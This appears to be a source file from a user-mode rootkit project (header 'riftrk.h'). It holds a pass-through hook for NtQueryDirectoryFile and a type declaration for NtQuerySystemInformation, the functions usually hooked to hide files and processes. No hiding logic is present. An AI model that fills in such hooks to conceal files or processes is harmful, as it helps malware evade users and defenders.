/* NT Hooks */
#include "riftrk.h"

NtQueryDirectoryFile_t NtQueryDirectoryFileO;
NTSTATUS NTAPI NtQueryDirectoryFileH(
	_In_                       HANDLE                 FileHandle,
	_In_opt_                   HANDLE                 Event,
	_In_opt_                   PVOID                  ApcRoutine,
	_In_opt_                   PVOID                  ApcContext,
	_Out_                      PVOID                  IoStatusBlock,
	_Out_writes_bytes_(Length) PVOID                  FileInformation,
	_In_                       ULONG                  Length,
	_In_                       FILE_INFORMATION_CLASS FileInformationClass,
	_In_                       BOOLEAN                ReturnSingleEntry,
	_In_opt_                   PUNICODE_STRING        FileName,
	_In_                       BOOLEAN                RestartScan
) {
	NTSTATUS s = NtQueryDirectoryFileO(FileHandle, Event, ApcRoutine,
		ApcContext, IoStatusBlock, FileInformation, Length,
		FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

    return s;
}









typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI*NtQuerySystemInformation_t)(
    _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_     PVOID                    SystemInformation,
    _In_      ULONG                    SystemInformationLength,
    _Out_opt_ PULONG                   ReturnLength
);





